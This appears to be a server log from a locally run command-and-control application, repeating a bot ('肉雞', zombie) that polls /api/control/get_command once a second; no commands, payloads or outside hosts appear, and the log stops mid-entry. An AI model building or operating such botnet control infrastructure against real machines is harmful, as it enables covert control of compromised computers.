2025-06-24 23:22:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:49 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:51 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:52 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:54 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:55 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:57 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:59 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:02 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:12 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:14 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:15 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:16 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:17 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:19 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:22 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:24 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:25 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:26 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:27 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:30 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:32 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:34 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
